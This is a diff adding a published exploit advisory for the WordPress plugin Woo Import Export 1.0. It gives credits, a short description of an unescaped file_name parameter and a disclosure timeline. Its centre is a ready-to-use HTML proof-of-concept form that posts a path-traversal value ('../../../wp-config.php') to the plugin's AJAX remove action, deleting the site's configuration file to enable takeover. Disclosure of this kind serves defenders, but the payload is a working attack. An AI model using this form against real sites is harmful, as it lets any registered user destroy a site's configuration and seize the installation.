@@ -1,0 +1,42 @@
+<!--
+# Exploit Title:  Plugin to Wordpress Woo Import Export 1.0 RCE – Unlink
+# Date: 24/04/2018
+# Exploit Author: Lenon Leite
+# Vendor Homepage: * https://wordpress.org/plugins/woo-import-export-lite/
+# Software Link: * https://wordpress.org/plugins/woo-import-export-lite/
+# Contact: http://twitter.com/lenonleite
+# Website: http://lenonleite.com.br/
+# Category: webapps
+# Version:  1.0
+# Tested on: Ubuntu 16.1
+
+
+1 - Description
+
+
+   - Type user access: any user registered.
+         - $_POST['file_name'] is not escaped.
+
+Article:
+*http://lenonleite.com.br/en/publish-exploits/english-plugin-woo-import-export-1-0-rce-unlink/
+
+Video:
+
+*https://www.youtube.com/watch?v=pImtGeecdCk
+
+2. Proof of Concept
+-->
+
+<form method="post"
+action="http://server/wp-admin/admin-ajax.php?action=wpie_remove_export_entry">
+   <input type="text" name="file_name" value="../../../wp-config.php">
+   <input type="text" name="log_id" value="aaa">
+   <input type="submit">
+</form>
+
+<!--
+   - Date Discovery : *11/25/2017*
+      - Date Vendor Contact : *12/29/2017*
+      - Date Publish : 24/04/2018
+      - Date Resolution :
+-->
